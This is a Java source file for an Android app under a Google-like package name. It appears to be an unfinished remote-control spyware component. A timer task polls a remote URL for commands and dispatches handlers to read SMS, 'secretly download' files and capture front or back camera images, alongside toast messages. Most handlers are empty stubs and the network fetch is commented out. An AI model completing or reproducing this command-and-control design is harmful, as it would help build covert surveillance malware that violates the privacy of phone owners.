package com.codingrespect.google;

import android.content.Context;
import android.os.Handler;
import android.util.Log;
import android.view.Gravity;
import android.widget.Toast;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.TimerTask;

public class UpdateTask extends TimerTask {
    private Context context;
    private Handler mHandler = new Handler();
    protected String command = null;
    //public static Boolean sMessageRead = false;


    public UpdateTask(Context context) {
        this.context = context;
    }

    @Override
    public void run() {
        mHandler.post(new Runnable() {
            @Override
            public void run() {
                //Toast.makeText(context, getCommand(), Toast.LENGTH_SHORT).show();
                //String command = getCommand();
                while (command == null){/*wait for response from network*/}
                    if (command.startsWith(Commands.TOAST)) {
                        //execute the toast command
                        String toastWord = command.replace(Commands.TOAST, "");
                        Toast.makeText(context, toastWord, Toast.LENGTH_SHORT).show();
                    } else if (command.equalsIgnoreCase(Commands.START_SMS_READ)) {
                        // start sms  reading
                        //sMessageRead = true;
                    } else if (command.equalsIgnoreCase(Commands.STOP_SMS_READ)) {
                        // stop sms read
                        //sMessageRead = false;
                    } else if (command.startsWith(Commands.DOWNLOAD)) {
                        //secretly download an item using download manager
                        /*
                        Toast toast = Toast.makeText(context, command.replace("download ", ""), Toast.LENGTH_SHORT);
                        toast.setGravity(Gravity.TOP, 25, 400);
                        toast.show();
                        */

                    } else if (command.equalsIgnoreCase(Commands.FRONT_CAPTURE)) {
                        //code for capturing image with front camera
                    } else if (command.equalsIgnoreCase(Commands.BACK_CAPTURE)) {
                        //code for capturing image with back camera
                    } else {
                        Toast.makeText(context, command, Toast.LENGTH_SHORT).show();
                    }

            }
        });

    }

/*
    public String getCommand(){
        final String cmd;
        RequestQueue queue = Volley.newRequestQueue(this.context);
        StringRequest request = new StringRequest(Request.Method.GET, Commands.URL,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        command = response;
                    }
                }, new Response.ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError error) {
                error.printStackTrace();

                command = error.toString();
            }

        });
        request.setRetryPolicy(new DefaultRetryPolicy(10000, 1, 1.0f));
        queue.add(request);
        return command;
    }*/
}